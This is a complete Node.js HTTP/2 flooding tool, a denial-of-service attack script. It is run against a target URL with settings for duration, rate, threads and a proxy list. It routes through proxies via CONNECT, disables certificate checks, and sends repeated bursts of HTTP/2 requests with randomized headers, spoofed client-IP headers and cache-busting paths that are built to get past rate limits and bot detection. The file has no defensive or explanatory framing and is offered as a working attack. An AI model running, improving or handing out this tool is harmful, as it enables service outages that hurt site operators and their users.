const net = require("net");
const http2 = require("http2" );
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const UserAgent = require('user-agents');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7) {
    console.log(`\x1b[31mUsage: node ${process.argv[1]} <target> <time> <rate> <threads> <proxyfile>\x1b[0m`);
    console.log("Example: node script.js https://example.com 60 100 4 proxies.txt" );
    process.exit();
}

const httpMethods = ["GET", "POST", "HEAD", "DELETE", "PATCH"];
const acceptHeaders = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'application/json, text/plain, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
    'application/xml,application/json,text/html,text/plain,image/png,image/jpeg',
    '*/*'
];
const langHeaders = [
    'en-US,en;q=0.9', 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'ko-KR,ko;q=0.9', 'ja-JP,ja;q=0.9', 'zh-CN,zh;q=0.9', 'de-DE,de;q=0.9',
    'es-ES,es;q=0.9', 'ru-RU,ru;q=0.9', 'it-IT,it;q=0.9', 'fr-FR,fr;q=0.9'
];
const encodingHeaders = [
    'gzip, deflate, br', 'gzip, deflate', 'br', 'deflate', 'gzip', 'identity'
];
const cacheControls = [
    'no-cache', 'max-age=0', 'no-store', 'must-revalidate', 'private', 'public'
];
const secChUa = [
    '"Not/A )Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    '"Not/A)Brand";v="8", "Chromium";v="126", "Microsoft Edge";v="126"',
    '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"'
];
const secChUaPlatforms = ["Windows", "Linux", "macOS", "Android", "iOS", "Chrome OS"];
const destHeaders = ['document', 'image', 'script', 'style', 'font', 'empty', 'video'];
const modeHeaders = ['navigate', 'cors', 'no-cors', 'same-origin'];
const siteHeaders = ['same-origin', 'same-site', 'cross-site', 'none'];
const referers = [
    "https://www.google.com/", "https://www.youtube.com/", "https://www.facebook.com/",
    "https://www.twitter.com/", "https://www.instagram.com/", "https://www.baidu.com/",
    "https://www.yandex.ru/", "https://www.bing.com/"
];
const customRateHeaders = [
    { "x-forwarded-for": "RANDOM_IP" }, { "x-forwarded-host": "RANDOM_HOST" },
    { "x-client-ip": "RANDOM_IP" }, { "via": "RANDOM_PROXY" },
    { "client-ip": "RANDOM_IP" }, { "x-real-ip": "RANDOM_IP" }
];

function readLines(filePath ) {
    try {
        return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error(`\x1b[31mError reading proxy file: ${filePath}\x1b[0m`);
        process.exit(1);
    }
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(arr) {
    return arr[randomInt(0, arr.length)];
}

function randomString(length) {
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function randomIp() {
    return `${randomInt(1, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}`;
}

const scriptArgs = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const proxies = readLines(scriptArgs.proxyFile);
const parsedTarget = url.parse(scriptArgs.target);

function generateDynamicHeaders() {
    const userAgent = new UserAgent();
    const path = parsedTarget.path + (parsedTarget.path.includes('?') ? '&' : '?') + randomString(10) + '=' + randomString(5);
    
    const dynamicHeaders = {
        ":method": randomElement(httpMethods ),
        ":authority": parsedTarget.host,
        ":path": path,
        ":scheme": "https",
        "user-agent": userAgent.toString( ),
        "accept": randomElement(acceptHeaders),
        "accept-encoding": randomElement(encodingHeaders),
        "accept-language": randomElement(langHeaders),
        "cache-control": randomElement(cacheControls),
        "sec-ch-ua": randomElement(secChUa),
        "sec-ch-ua-mobile": userAgent.isMobile ? "?1" : "?0",
        "sec-ch-ua-platform": `"${randomElement(secChUaPlatforms)}"`,
        "sec-fetch-dest": randomElement(destHeaders),
        "sec-fetch-mode": randomElement(modeHeaders),
        "sec-fetch-site": randomElement(siteHeaders),
        "upgrade-insecure-requests": "1"
    };

    if (Math.random() > 0.5) {
        dynamicHeaders["sec-fetch-user"] = "?1";
    }
    if (Math.random() > 0.7) {
        dynamicHeaders["referer"] = randomElement(referers);
    }
    if (Math.random() > 0.6) {
        dynamicHeaders["origin"] = `https://${parsedTarget.host}`;
    }
    if (Math.random( ) > 0.8) {
        dynamicHeaders["te"] = "trailers";
    }

    const rateHeader = { ...randomElement(customRateHeaders) };
    const headerKey = Object.keys(rateHeader)[0];
    if (rateHeader[headerKey] === "RANDOM_IP") {
        rateHeader[headerKey] = randomIp();
    } else if (rateHeader[headerKey] === "RANDOM_HOST") {
        rateHeader[headerKey] = parsedTarget.host;
    } else if (rateHeader[headerKey] === "RANDOM_PROXY") {
        rateHeader[headerKey] = `1.1 ${randomIp()}`;
    }
    Object.assign(dynamicHeaders, rateHeader);

    return dynamicHeaders;
}

if (cluster.isMaster) {
    for (let i = 0; i < scriptArgs.threads; i++) {
        cluster.fork();
    }
    console.clear();
    console.log(`\x1b[1m\x1b[34mTarget: \x1b[0m\x1b[1m${parsedTarget.host}\x1b[0m`);
    console.log(`\x1b[1m\x1b[33mDuration: \x1b[0m\x1b[1m${scriptArgs.time}s\x1b[0m`);
    console.log(`\x1b[1m\x1b[32mThreads: \x1b[0m\x1b[1m${scriptArgs.threads}\x1b[0m`);
    console.log(`\x1b[1m\x1b[31mRate per Thread: \x1b[0m\x1b[1m${scriptArgs.rate}\x1b[0m`);
    
    setTimeout(() => {
        console.log('\x1b[1m\x1b[35mAttack finished.\x1b[0m');
        process.exit(0);
    }, scriptArgs.time * 1000);

} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() {}
    http(options, callback ) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true
        });
        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => connection.write(buffer));
        connection.on("data", chunk => {
            if (chunk.toString("utf-8").includes("HTTP/1.1 200")) {
                return callback(connection, undefined);
            }
            connection.destroy();
            return callback(undefined, "error: invalid proxy response");
        });
        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: proxy timeout");
        });
        connection.on("error", () => {
            connection.destroy();
            return callback(undefined, "error: proxy connection error");
        });
    }
}

const socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const [host, port] = proxyAddr.split(":");

    const proxyOptions = {
        host: host,
        port: ~~port,
        address: parsedTarget.host,
        timeout: 15
    };

    socker.http(proxyOptions, (connection, error ) => {
        if (error) return;

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2', 'http/1.1'],
            ciphers: [
                'TLS_AES_128_GCM_SHA256',
                'TLS_AES_256_GCM_SHA384',
                'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-RSA-AES128-GCM-SHA256',
                'ECDHE-RSA-AES256-GCM-SHA384',
                'ECDHE-ECDSA-AES128-GCM-SHA256',
                'ECDHE-ECDSA-AES256-GCM-SHA384'
            ].join(':' ),
            ecdhCurve: 'auto',
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            secureOptions: crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE
        };

        const tlsConn = tls.connect(443, parsedTarget.host, { ...tlsOptions, socket: connection });
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            createConnection: ( ) => tlsConn,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 5000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            }
        });

        client.on("connect", () => {
            const interval = setInterval(() => {
                for (let i = 0; i < scriptArgs.rate; i++) {
                    const dynamicHeaders = generateDynamicHeaders();
                    const request = client.request(dynamicHeaders);
                    request.on("response", () => {});
                    request.on("error", (err) => {});
                    request.end();
                }
            }, 500);

            client.on("close", () => {
                clearInterval(interval);
                client.destroy();
                connection.destroy();
            });
        });

        client.on("error", (err) => {
            client.destroy();
            connection.destroy();
        });
    });
}
